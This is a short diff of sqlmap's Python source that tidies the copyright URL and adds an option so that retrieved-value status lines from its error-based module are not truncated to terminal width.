@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 
 """
-Copyright (c) 2006-2025 sqlmap developers (https://sqlmap.org/)
+Copyright (c) 2006-2025 sqlmap developers (https://sqlmap.org)
 See the file 'LICENSE' for copying permission
 """
 
@@ -257,7 +257,7 @@ def _errorFields(expression, expressionFields, expressionFieldsList, num=None, e
             elif output is not None and not (threadData.resumed and kb.suppressResumeInfo) and not (emptyFields and field in emptyFields):
                 status = "[%s] [INFO] %s: '%s'" % (time.strftime("%X"), "resumed" if threadData.resumed else "retrieved", output if kb.safeCharEncode else safecharencode(output))
 
-                if len(status) > width:
+                if len(status) > width and not conf.noTruncate:
                     status = "%s..." % status[:width - 3]
 
                 dataToStdout("%s\n" % status)
